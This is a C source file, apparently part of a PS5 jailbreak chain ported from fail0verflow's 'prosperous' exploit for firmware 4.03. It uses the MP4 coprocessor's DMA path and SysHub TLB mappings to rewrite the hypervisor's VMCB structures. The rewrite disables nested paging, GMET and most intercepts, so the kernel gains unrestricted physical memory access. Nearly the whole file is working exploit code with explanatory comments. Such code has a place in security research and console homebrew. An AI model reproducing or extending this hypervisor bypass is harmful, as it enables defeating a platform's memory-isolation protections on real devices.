/*
 * VMCB (Virtual Machine Control Block) patching via MP4 coprocessor.
 *
 * Ported from fail0verflow's prosperous exploit for PS5 FW 4.03.
 *
 * The PS5 hypervisor uses AMD SVM (Secure Virtual Machine) with nested
 * paging to isolate guest (kernel) memory from the hypervisor. The VMCB
 * structure controls VM execution, including:
 *   - Instruction intercepts (offset 0x00-0x14)
 *   - Nested paging control (offset 0x90)
 *
 * By disabling nested paging (NP_ENABLE=0) and clearing intercepts,
 * the kernel gains direct access to all physical memory without HV
 * mediation. This also disables GMET (Guest Mode Execute Trap) which
 * is part of the NDA (Non-Debug Area) enforcement.
 *
 * The VMCB structures are in HV-protected physical memory, so we use
 * the MP4 coprocessor (which has its own DMA path that bypasses x86
 * memory protections) to read and write them.
 *
 * Memory layout:
 *   - vcpu_ctxs_pa (0x628485D0): Array of vCPU context structures
 *   - Each vCPU ctx has a pointer to its VMCB at offset +0x08
 *   - The HV VA base is at PA 0x62848000
 *   - VMCB PA = VMCB VA - hv_va_base
 *
 * We use SysHub TLB entries 32-33 to map the HV physical region into
 * the MP4's address space for access.
 */

#include <stdint.h>
#include <string.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/* Number of vCPU contexts to patch (PS5 has up to 16 logical CPUs) */
#define MAX_VCPUS   16

/* vCPU context structure stride */
#define VCPU_CTX_SIZE   0x320

/* Offset of VMCB pointer within vCPU context */
#define VCPU_CTX_VMCB_OFF  0x08

/*
 * Convert a system physical address to an MP4 virtual address,
 * assuming the PA is mapped by SysHub TLB entries 32-33 which
 * provide a 128MB identity mapping at MP4 VA 0x80000000.
 */
static uint32_t sys_pa_to_mp4_va(uint64_t sys_pa, uint64_t vcpu_ctxs_mp4_base)
{
    uint64_t offset = sys_pa - vcpu_ctxs_mp4_base;
    if (offset >= 0x08000000) /* 128MB limit */
        return 0;
    return 0x80000000 + (uint32_t)offset;
}

/*
 * Patch all VMCB structures to disable nested paging and most intercepts.
 *
 * Prerequisites:
 *   - TMR HV regions disabled (tmr_disable_hv_regions)
 *   - MP4 payload injected and active (mp4_inject_payload)
 *
 * For each vCPU:
 *   1. Setup SysHub TLB 32-33 to map the VMCB physical memory
 *   2. Read VMCB pointer from vCPU context
 *   3. Convert HV VA -> PA using hv_va_base
 *   4. Set NP_CTRL to 0 (disable nested paging + GMET)
 *   5. Clear most intercept vectors (keep VMSAVE/VMLOAD/VMMCALL/VMRUN)
 *
 * This is a destructive operation - once done, the HV no longer enforces
 * memory isolation. The kernel can access all physical memory directly.
 */
int vmcb_patch_disable_np(struct phys_rw_ctx *ctx)
{
    uint64_t vcpu_ctxs_pa = VCPU_CTXS_PA;
    uint64_t vcpu_ctxs_mp4_base;
    uint64_t hv_va_base;
    uint32_t sub_page_rw;
    int i;

    /* Align vcpu_ctxs_pa to 64MB boundary for TLB mapping */
    vcpu_ctxs_mp4_base = vcpu_ctxs_pa & ~0x03FFFFFFULL;

    /* Setup SysHub TLB entries 32-33 to map the HV region.
     * TLB 32: maps vcpu_ctxs_pa region
     * TLB 33: maps vcpu_ctxs_pa + 64MB (for VMCB data) */
    if (mp4_syshub_tlb_setup(ctx, 32, vcpu_ctxs_pa) != 0)
        return -1;
    if (mp4_syshub_tlb_setup(ctx, 33, vcpu_ctxs_pa + 0x04000000) != 0)
        return -2;

    /* Update SysHub TLB sub-page RW cache to allow writes.
     * Without this, the cache may restore the register to zero (depending
     * on FW version), blocking our writes. */
    sub_page_rw = 0xFFFFFFFF;
    mp4_write32(ctx, MP4_SYSHUB_SUB_PAGE_RW_CACHE + 0xC + 4 * (32 - 1), sub_page_rw);
    mp4_write32(ctx, MP4_SYSHUB_SUB_PAGE_RW_CACHE + 0xC + 4 * (33 - 1), sub_page_rw);

    /* Read HV VA base from the HV data area.
     * The first qword at PA 0x62848000 contains the HV's virtual address base. */
    hv_va_base = mp4_read64(ctx,
        sys_pa_to_mp4_va(0x62848000, vcpu_ctxs_mp4_base));

    /* Iterate over all vCPU contexts and patch their VMCBs */
    for (i = 0; i < MAX_VCPUS; i++) {
        uint64_t ctx_addr_pa = vcpu_ctxs_pa + VCPU_CTX_SIZE * i + VCPU_CTX_VMCB_OFF;
        uint32_t ctx_addr_mp4_va = sys_pa_to_mp4_va(ctx_addr_pa, vcpu_ctxs_mp4_base);
        uint64_t vmcb_va, vmcb_pa;
        uint32_t vmcb_mp4_va;
        uint64_t np_ctrl;
        uint32_t vec0, vec3, vec4, intercept_cpuid;

        if (ctx_addr_mp4_va == 0)
            continue;

        /* Read VMCB virtual address from vCPU context */
        vmcb_va = mp4_read64(ctx, ctx_addr_mp4_va);
        if (vmcb_va == 0)
            continue;

        /* Convert HV VA to PA */
        vmcb_pa = vmcb_va - hv_va_base;
        vmcb_mp4_va = sys_pa_to_mp4_va(vmcb_pa, vcpu_ctxs_mp4_base);
        if (vmcb_mp4_va == 0)
            continue;

        /* Read NP_CTRL (offset 0x90 in VMCB) */
        np_ctrl = mp4_read64(ctx, vmcb_mp4_va + VMCB_NP_CTRL);

        /* If already zero, VMCBs were previously modified */
        if (np_ctrl == 0)
            break;

        /* Sanity check: NP_CTRL should be 0x09 (NP_ENABLE=1 + some flags) */
        if ((np_ctrl & 0xFF) != 0x09)
            return -3; /* Unexpected VMCB state */

        /* Disable nested paging: set NP_ENABLE=0, GMET=0 */
        mp4_write64(ctx, vmcb_mp4_va + VMCB_NP_CTRL, 0);

        /* Read current intercept vectors */
        vec0 = mp4_read32(ctx, vmcb_mp4_va + VMCB_INTERCEPT_VEC0);
        vec3 = mp4_read32(ctx, vmcb_mp4_va + VMCB_INTERCEPT_VEC3);
        vec4 = mp4_read32(ctx, vmcb_mp4_va + VMCB_INTERCEPT_VEC4);

        /* Preserve CPUID intercept bit (may be needed for compatibility) */
        intercept_cpuid = vec3 & (1 << 18);

        /* Clear all intercepts in vec0 */
        mp4_write32(ctx, vmcb_mp4_va + VMCB_INTERCEPT_VEC0, 0);

        /* Set vec3 to only CPUID intercept (if it was set) */
        if (vec3 != intercept_cpuid)
            mp4_write32(ctx, vmcb_mp4_va + VMCB_INTERCEPT_VEC3, intercept_cpuid);

        /* Keep VMSAVE(0x1), VMLOAD(0x2), VMMCALL(0x4), VMRUN(0x8) in vec4.
         * Without these, process context switches hang. */
        mp4_write32(ctx, vmcb_mp4_va + VMCB_INTERCEPT_VEC4, 0x0F);

        (void)vec0;
        (void)vec4;
    }

    return 0;
}
